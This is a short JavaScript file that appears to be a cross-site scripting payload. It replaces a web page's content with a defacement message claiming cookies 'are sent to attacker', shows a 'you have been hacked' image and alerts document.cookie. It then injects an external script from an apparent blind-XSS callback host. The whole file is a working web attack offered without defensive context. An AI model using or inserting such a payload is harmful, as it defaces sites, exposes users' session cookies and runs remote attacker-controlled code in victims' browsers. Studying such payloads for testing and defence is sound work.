// Clear the current content of the body
document.body.innerHTML = "";

// Set the document title
document.title = "New Website Title";

// Create and append new elements
var newHeader = document.createElement('h1');
newHeader.textContent = "This website is under Abhishek Control now, your cookie are sent to attacker!";
document.body.appendChild(newHeader);

var newParagraph = document.createElement('p');
newParagraph.textContent = "Welcome to the new version of the website.";
document.body.appendChild(newParagraph);

// Create and append the image
var newImage = document.createElement('img');
newImage.src = "https://cdn.vectorstock.com/i/1000x1000/01/05/message-you-have-been-hacked-vector-20550105.webp";
newImage.alt = "You have been hacked";
newImage.style.maxWidth = "100%";
document.body.appendChild(newImage);

// Apply some basic styles
document.body.style.fontFamily = "Arial, sans-serif";
document.body.style.backgroundColor = "#f0f0f0";
document.body.style.margin = "0";
document.body.style.padding = "20px";

newHeader.style.color = "#333";
newParagraph.style.color = "#666";
newImage.style.display = "block";
newImage.style.marginTop = "20px";

// Alert cookies
alert("here_are_your_cookies:_ " + document.cookie);

// Dynamically load an external script
var script = document.createElement('script');
script.src = "https://abhishek.bxss.in";
document.head.appendChild(script);
